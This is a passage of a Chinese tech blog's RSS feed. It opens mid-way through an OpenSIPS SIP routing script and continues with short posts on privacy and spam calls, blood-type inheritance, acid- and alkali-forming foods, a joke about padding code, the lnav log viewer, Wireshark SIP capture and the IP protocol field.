&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# when routing via usrloc, log the missed calls also&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# for INVITEs enable some additional helper routes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_branch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;per_branch_ops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;handle_nat&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed_call&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;500&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Internal Error&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;branch_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;per_branch_ops&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;new branch at &lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;onreply_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;handle_nat&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;incoming reply\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;failure_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;missed_call&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_was_cancelled&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# uncomment the following lines if you want to block client &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# redirect based on 3xx replies.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##if (t_check_status(&amp;#34;3[0-9][0-9]&amp;#34;)) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##t_reply(&amp;#34;404&amp;#34;,&amp;#34;Not found&amp;#34;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##	exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>大数据时代的平民新装</title>
      <link>https://wdd.js.org/posts/2020/04/pgwzdz/</link>
      <pubDate>Sun, 05 Apr 2020 08:41:48 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/04/pgwzdz/</guid>
      <description>&lt;p&gt;之前在百毒搜索了一下营养师考证，然后最近就经常收到骚扰电话，咨询我是否有意参加考试。&lt;/p&gt;
&lt;p&gt;在没有留任何电话号码的情况下，我的手机号就被精准的定位到。可想而知个人隐私问题是多么严重。&lt;/p&gt;
&lt;p&gt;以前只有皇帝一个人穿透明新装，现在每个人都穿着这件衣服。&lt;/p&gt;</description>
    </item>
    <item>
      <title>孩子血型一定和父母血型相同吗？</title>
      <link>https://wdd.js.org/posts/2020/04/vhovyr/</link>
      <pubDate>Wed, 01 Apr 2020 13:33:51 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/04/vhovyr/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;之前看过一个报道，父亲发现儿子的血型和自己以及妻子的血型都不一样，怀疑儿子不是自己亲生的，最后把自己妻儿弄死了。但是孩子的DNA检测显示是自己亲生的。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这是一个不懂血型相关知识的悲剧啊。&lt;/p&gt;
&lt;p&gt;血型是由红细胞表面的两种抗原决定的。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;A抗原&lt;/th&gt;
          &lt;th&gt;B抗原&lt;/th&gt;
          &lt;th&gt;血型&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;A&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;B&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;AB&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;O&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;下图的表格是父母血型与子女血型的可能性与比例。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;父母血型&lt;/th&gt;
          &lt;th&gt;子女可能有血型及比例&lt;/th&gt;
          &lt;th&gt;子女不可能有血型&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;O、O&lt;/td&gt;
          &lt;td&gt;O&lt;/td&gt;
          &lt;td&gt;A、B、AB&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;O、A&lt;/td&gt;
          &lt;td&gt;O、A （1：3）&lt;/td&gt;
          &lt;td&gt;B、AB&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;O、B&lt;/td&gt;
          &lt;td&gt;O、B （1：3）&lt;/td&gt;
          &lt;td&gt;A、AB&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;O、AB&lt;/td&gt;
          &lt;td&gt;A、B （1：1）&lt;/td&gt;
          &lt;td&gt;O、AB&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;A、A&lt;/td&gt;
          &lt;td&gt;O、A （1：15）&lt;/td&gt;
          &lt;td&gt;B、AB&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;A、B&lt;/td&gt;
          &lt;td&gt;A、B、AB、O (3:3:9:1)&lt;/td&gt;
          &lt;td&gt;—&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;A、AB&lt;/td&gt;
          &lt;td&gt;A、B、AB （4：1：3）&lt;/td&gt;
          &lt;td&gt;O&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;B、B&lt;/td&gt;
          &lt;td&gt;O、B（1：15）&lt;/td&gt;
          &lt;td&gt;A、AB&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;B、AB&lt;/td&gt;
          &lt;td&gt;A、B、AB（1：4：3）&lt;/td&gt;
          &lt;td&gt;O&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;AB、AB&lt;/td&gt;
          &lt;td&gt;A、B、AB（1：1：2）&lt;/td&gt;
          &lt;td&gt;O&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;虽说孩子的血型不一定和父母的血型相同。但是如果父母都是O型血，生出的孩子如果不是O型，那么不是亲生的可能性也是蛮大的。&lt;/p&gt;</description>
    </item>
    <item>
      <title>食物的酸碱性的误解</title>
      <link>https://wdd.js.org/posts/2020/04/ly7nlv/</link>
      <pubDate>Wed, 01 Apr 2020 13:04:30 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/04/ly7nlv/</guid>
      <description>&lt;p&gt;大多数人可能由下面的两种方式去判断食物的酸碱性&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;舌头👅。用嘴巴尝一下，酸的食物就是酸性的。&lt;/li&gt;
&lt;li&gt;ph值。可以用ph试纸&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;以上两种判断食物酸碱性的方法都是错误的。&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;食物的酸碱性，取决于食物中含有矿物质的种类和含量。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;碱性食物：含有钠、钾、钙、镁、铁&lt;/li&gt;
&lt;li&gt;酸性食物：还有磷、氯、硫&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从元素周期表中也可以看出来，酸碱性相同的物质基本都是比较靠近的。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/04/ly7nlv/2022-10-29-20-14-19.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;含有钠钾钙镁铝的食物，进入人体之后，在人体的氧化作用下，最终代谢产物呈现碱性。&lt;/p&gt;
&lt;p&gt;另外，大部分的水果，例如柠檬、橙子、苹果这种的，吃起来是酸的，而实际上他们是碱性食物。&lt;/p&gt;
&lt;p&gt;食物分类表&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;项目&lt;/th&gt;
          &lt;th&gt;举例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;强酸性食物&lt;/td&gt;
          &lt;td&gt;牛肉、猪肉、鸡肉、金枪鱼、牡蛎、比目鱼、奶酪、米、麦、面包、酒类、花生、核桃、糖、饼干、啤酒等&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;弱酸性食物&lt;/td&gt;
          &lt;td&gt;火腿、鸡蛋、龙虾、章鱼、鱿鱼、荞麦、奶油、豌豆、鳗鱼、河鱼、巧克力、葱、空心粉、炸豆腐等&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;强碱性食物&lt;/td&gt;
          &lt;td&gt;茶、白菜、柿子、黄瓜、胡萝卜、菠菜、卷心菜、生菜、芋头、海带、柑橘、无花果、西瓜、葡萄、板栗、咖啡、葡萄酒等&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;弱碱性食物&lt;/td&gt;
          &lt;td&gt;豆腐、豌豆、大豆、绿豆、竹笋、马铃薯、香菇、蘑菇、油菜、南瓜、芹菜、番薯、莲藕、洋葱、茄子、萝卜、牛奶、苹果、梨、香蕉、樱桃等&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>代码增肥赋</title>
      <link>https://wdd.js.org/posts/2020/03/wyeo4w/</link>
      <pubDate>Tue, 24 Mar 2020 13:42:26 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/03/wyeo4w/</guid>
      <description>&lt;p&gt;大学，编程之师作业，曰：xxx功能，至少代码三千行。&lt;/p&gt;
&lt;p&gt;室友呕心沥血，废寝忘食，东拼西凑。奈何凑到代码一千行。&lt;/p&gt;
&lt;p&gt;友不释然，怏怏不乐。求助于我。&lt;/p&gt;
&lt;p&gt;于告知曰：此事易尔！但需可乐两瓶、瓜子两包。&lt;/p&gt;
&lt;p&gt;友悦之，曰：请稍等，片刻回。&lt;/p&gt;
&lt;p&gt;友即回，代码亦成。&lt;/p&gt;
&lt;p&gt;友黯然道：子之功力，无不及也。&lt;/p&gt;
&lt;p&gt;于笑曰：无他，但手熟而。&lt;/p&gt;
&lt;p&gt;多加注释多换行，一不留神三千行。&lt;/p&gt;
&lt;p&gt;😂😂😂😂🤣🤣🤣🤣😅😅😅😅&lt;/p&gt;</description>
    </item>
    <item>
      <title>devicemap  驱动模式修改</title>
      <link>https://wdd.js.org/posts/2020/03/eaikcr/</link>
      <pubDate>Fri, 20 Mar 2020 17:32:30 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/03/eaikcr/</guid>
      <description></description>
    </item>
    <item>
      <title>命令行日志查看神器：lnav</title>
      <link>https://wdd.js.org/posts/2020/03/wikbh8/</link>
      <pubDate>Fri, 13 Mar 2020 21:48:40 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/03/wikbh8/</guid>
      <description>&lt;p&gt;lnav, 不需要服务端，不需要设置，仍然功能强大到没有朋友。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/03/wikbh8/2022-10-29-20-45-45.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;速度与性能&#34;&gt;速度与性能&lt;/h1&gt;
&lt;p&gt;lnav是一个可以运行在终端上的日志分析工具。功能非常强大，如果grep和tail等命令无法满足你的需求，或许你可以尝试一下lnav。&lt;/p&gt;
&lt;p&gt;lnav的官方仓库是&lt;a href=&#34;https://github.com/tstack/lnav&#34;&gt;https://github.com/tstack/lnav&lt;/a&gt;，在mac上可以使用 &lt;code&gt;brew install lnav&lt;/code&gt; 命令安装这个命令。&lt;/p&gt;
&lt;p&gt;在我的4C8G的Macbook Pro上，打开一个2.8G的日志文件到渲染出现，需要花费约40s，平均每秒载入超过70MB。载入日志和渲染时，使用了接近100%的CPU。渲染完毕，使用1.2G的内存空间。&lt;/p&gt;
&lt;p&gt;总之呢，这个工具载入日志的速度很快。但是最好不要再生产环境上使用这个命令载入过大的日志文件，否则可能造成系统资源消耗太大的问题。&lt;/p&gt;
&lt;p&gt;在载入2.8G的日志文件后(3200多万行)，过滤时显得非常卡顿，但是查看日志并不卡顿。&lt;/p&gt;
&lt;p&gt;在lnav的搜索关键字，下次打开其他日志时，lnav会自动搜索这个关键词。这是它的Session记录功能，可以使用Ctrl+R重置Session。&lt;/p&gt;
&lt;p&gt;lnav的特点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;语法高亮&lt;/li&gt;
&lt;li&gt;各种过滤条件
&lt;ul&gt;
&lt;li&gt;多关键词过滤&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;各种快捷跳转&lt;/li&gt;
&lt;li&gt;自带统计和可视化功能，比如使用条形图展示单位时间内的报错和日志数量&lt;/li&gt;
&lt;li&gt;自动日志格式检查。支持很多种日志格式&lt;/li&gt;
&lt;li&gt;能够按照时间去过滤日志&lt;/li&gt;
&lt;li&gt;TAB自动补全&lt;/li&gt;
&lt;li&gt;实时操作&lt;/li&gt;
&lt;li&gt;支持SQL语法查日志&lt;/li&gt;
&lt;li&gt;支持文件导出成其他格式&lt;/li&gt;
&lt;li&gt;支持直接打开tar.gz等压缩后的日志文件&lt;/li&gt;
&lt;li&gt;支持很多快捷键&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;x下面是按天的日志统计，灰色是普通日志，黄色是告警日志，红色的错误日志。三种颜色叠加的长度就是总日志。时间跨度单位也是可以调节的。最大跨度是一天，最短跨度是1秒。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/03/wikbh8/2022-10-29-20-46-14.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;仍然是日志格式&#34;&gt;仍然是日志格式&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/03/wikbh8/2022-10-29-20-46-21.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;自动日志格式检测&#34;&gt;自动日志格式检测&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;系统日志&lt;/li&gt;
&lt;li&gt;Web服务器访问日志&lt;/li&gt;
&lt;li&gt;报错日志&lt;/li&gt;
&lt;li&gt;等等&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;过滤&#34;&gt;过滤&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;可以设置多个过滤规则&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/03/wikbh8/2022-10-29-20-46-28.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;时间线过滤&#34;&gt;时间线过滤&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;精确时间的日志&lt;/li&gt;
&lt;li&gt;上个小时，下个小时&lt;/li&gt;
&lt;li&gt;上一分钟，下一分钟&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;能够按照时间去追踪日志&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/03/wikbh8/2022-10-29-20-46-35.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;按照时间周期统计&#34;&gt;按照时间周期统计&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;统计每秒出现的错误，告警和总日志的量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/03/wikbh8/2022-10-29-20-46-41.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;语法高亮&#34;&gt;语法高亮&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/03/wikbh8/2022-10-29-20-46-47.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;tab键自动补全&#34;&gt;Tab键自动补全&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/03/wikbh8/2022-10-29-20-46-53.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://lnav.readthedocs.io/en/latest/&#34;&gt;https://lnav.readthedocs.io/en/latest/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;如果你更喜欢GUI工具，那也可以试试&lt;a href=&#34;https://github.com/nickbnf/glogg&#34;&gt;https://github.com/nickbnf/glogg&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;后记&#34;&gt;后记&lt;/h1&gt;
&lt;p&gt;最近因为工作需要，每天都会去排查很多的日志文件。我也曾想过装ELK之类的工具，但是我收到是文件。日志文件要转存到ELK中也要花功夫。另外ELK也是非常耗费资源的。ELK部署到一半我就果断放弃了。&lt;/p&gt;
&lt;p&gt;与其南辕北辙，不如回归本质。找些命令行的小工具直接分析日志文件。&lt;/p&gt;</description>
    </item>
    <item>
      <title>网络包的封装和分用</title>
      <link>https://wdd.js.org/network/mlepcg/</link>
      <pubDate>Wed, 11 Mar 2020 08:24:20 +0800</pubDate>
      <guid>https://wdd.js.org/network/mlepcg/</guid>
      <description>&lt;p&gt;图解包在TCP/IP各个协议栈的流动情况&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.processon.com/embed/5e682878e4b069aa4e5b845f&#34;&gt;点击查看【undefined】&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Wireshark SIP 抓包</title>
      <link>https://wdd.js.org/opensips/tools/wireshark-sip/</link>
      <pubDate>Mon, 09 Mar 2020 12:19:37 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/wireshark-sip/</guid>
      <description>&lt;h1 id=&#34;1-打开wireshark并选择网卡&#34;&gt;1. 打开wireshark，并选择网卡&lt;/h1&gt;
&lt;p&gt;在过滤条件中输入sip
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/tools/wireshark-sip/2022-12-02-17-21-05.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-选择电话--voip-calls&#34;&gt;2. 选择电话-&amp;gt; VoIP Calls&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/tools/wireshark-sip/2022-12-02-17-21-15.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-选中一条呼叫记录-然后点击-flow-sequence&#34;&gt;3. 选中一条呼叫记录-&amp;gt;然后点击 Flow Sequence&lt;/h1&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;h1 id=&#34;4-查看消息的详情&#34;&gt;4. 查看消息的详情&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/tools/wireshark-sip/2022-12-02-17-21-59.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>IP协议 Protocol</title>
      <link>https://wdd.js.org/network/ip-protocol/</link>
      <pubDate>Thu, 05 Mar 2020 12:48:10 +0800</pubDate>
      <guid>https://wdd.js.org/network/ip-protocol/</guid>
      <description>&lt;h1 id=&#34;ip协议格式&#34;&gt;IP协议格式&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/ip-protocol/2022-10-29-15-26-15.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;字段说明&#34;&gt;字段说明 &lt;/h1&gt;
&lt;h2 id=&#34;protocol&#34;&gt;Protocol&lt;/h2&gt;
&lt;p&gt;表示上层协议，也就是传输层是什么协议。&lt;/p&gt;
